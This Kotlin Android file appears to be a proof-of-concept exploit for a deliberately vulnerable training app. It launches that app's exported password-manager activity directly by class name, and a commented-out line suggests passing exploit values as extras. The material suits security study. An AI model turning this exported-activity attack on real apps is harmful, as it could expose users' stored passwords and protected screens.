package com.zin.call_activity

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Intent to vulnerable exported activity
        val intent = Intent()
        intent.setClassName("com.zin.dvac", "com.zin.dvac.PasswordManagerActivity")

        // Optional: add extras for exploitation
        // intent.putExtra("key", "exploit_value")

        startActivity(intent)
        finish()
    }
}

